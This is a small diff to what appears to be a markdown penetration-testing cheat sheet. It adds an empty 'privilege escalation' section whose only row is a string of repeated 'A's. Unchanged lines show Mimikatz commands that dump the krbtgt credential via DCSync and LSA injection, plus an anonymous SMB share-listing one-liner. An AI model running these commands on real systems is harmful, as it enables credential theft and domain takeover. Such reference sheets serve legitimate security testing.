@@ -140,6 +140,13 @@
 |Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'|
 |Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'|
 
+
+### Window Common Privilge Escalation
+| for Example  |
+| ------------- |
+|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|
+
+
 | Linxu and Microsoft RPC Enumeration  |
 | ------------- |
 | smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
